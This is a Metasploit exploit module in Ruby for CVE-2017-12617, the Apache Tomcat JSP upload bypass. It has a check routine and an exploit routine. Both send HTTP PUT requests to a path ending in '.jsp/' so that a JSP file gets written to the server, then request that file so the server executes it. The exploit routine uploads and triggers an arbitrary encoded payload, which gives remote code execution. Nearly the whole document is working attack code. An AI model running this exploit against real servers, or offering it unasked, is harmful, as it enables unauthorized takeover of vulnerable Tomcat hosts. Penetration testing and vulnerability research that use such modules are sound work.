##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Tomcat RCE via JSP Upload Bypass',
      'Description'    => %q{
        This module uploads a jsp payload and executes it.
      },
      'Author'      => 'peewpw',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-12617' ],
          [ 'URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617' ],
          [ 'URL', 'https://bz.apache.org/bugzilla/show_bug.cgi?id=61542' ]
        ],
      'Privileged'     => false,
      'Platform'    => %w{ linux win }, # others?
      'Targets'     =>
        [
          [ 'Automatic',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'win'
            }
          ],
          [ 'Java Windows',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'win'
            }
          ],
          [ 'Java Linux',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'linux'
            }
          ]
        ],
      'DisclosureDate' => 'Oct 03 2017',
      'DefaultTarget'  => 0))

    register_options([
        OptString.new('TARGETURI', [true, "The URI path of the Tomcat installation", "/"]),
        Opt::RPORT(8080)
      ])
  end

  def check
    testurl = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, "#{testurl}.jsp/"),
      'method'    => 'PUT',
      'data'      => "<% out.println(\"#{testcontent}\");%>"
    })

    res1 = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, "#{testurl}.jsp"),
      'method'    => 'GET'
    })

    if res1 && res1.body.include?(testcontent)
      send_request_cgi(
        opts = {
          'uri'       => normalize_uri(target_uri.path, "#{testurl}.jsp/"),
          'method'    => 'DELETE'
        },
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading payload...")
    testurl = Rex::Text::rand_text_alpha(10)

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, "#{testurl}.jsp/"),
      'method'    => 'PUT',
      'data'      => payload.encoded
    })
    if res && res.code == 201
      res1 = send_request_cgi({
        'uri'       => normalize_uri(target_uri.path, "#{testurl}.jsp"),
        'method'    => 'GET'
      })
      if res1 && res1.code == 200
        print_status("Payload executed!")
      else
        fail_with(Failure::PayloadFailed, "Failed to execute the payload")
      end
    else
      fail_with(Failure::UnexpectedReply, "Failed to upload the payload")
    end
  end

end